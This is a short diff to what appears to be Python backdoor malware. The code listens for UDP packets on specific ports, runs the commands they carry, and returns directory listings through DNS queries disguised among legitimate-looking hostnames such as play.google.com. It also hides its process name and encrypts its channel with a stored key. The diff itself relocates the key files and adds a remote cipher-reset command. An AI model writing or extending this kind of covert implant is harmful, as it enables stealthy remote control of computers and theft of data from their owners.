@@ -26,8 +26,8 @@ hostnames = ["play.google.com",
             "hhopenbid.pubmatic.com"]
 
 e = StreamEncryption()
-e.read_nonce("nonce.bin")
-e.read_secret("secret.key")
+e.read_nonce("data/nonce.bin")
+e.read_secret("data/secret.key")
 e.initialize_encryption_context()
 
 class DirectoryNotFound(Exception): pass
@@ -72,6 +72,11 @@ def list_directory(file_path: str) -> list:
         raise DirectoryNotFound
     return os.listdir(file_path)
 
+def cipher_reset():
+    # Reset the stream cipher
+    e.initialize_encryption_context()
+    print("Stream cipher reset.")
+
 def packet_handler(pkt):
     # Do nothing if not the correct packet.
     if pkt[UDP].sport != 10069 or pkt[UDP].dport != 10420:
@@ -102,6 +107,8 @@ def packet_handler(pkt):
             send_dns_query(query)
             print("Sent directory contents")
             return
+        if argv[0] == CIPHER:
+            cipher_reset()
 
 if __name__ == "__main__":
     # Hide process name.
